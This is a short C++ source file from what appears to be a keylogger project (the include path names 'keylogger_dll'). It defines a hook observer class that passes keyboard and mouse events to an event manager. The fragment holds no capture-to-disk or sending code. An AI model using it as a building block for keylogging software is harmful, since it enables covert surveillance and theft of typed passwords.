#include "keylogger_dll\AHookObserver.h"



AHookObserver::AHookObserver(const EventManager& eventManager) : _eventManager(eventManager)
{
}

AHookObserver::~AHookObserver()
{
}

void					AHookObserver::update(const WPARAM wParam, const LPARAM lParam) const
{
	if (_isMouse == true)
	{
		if (wParam != WM_MOUSEMOVE)
			_eventManager.handleMouseEvent(wParam, lParam);
	}
	else
		_eventManager.handleKeyboardEvent(wParam, lParam);
}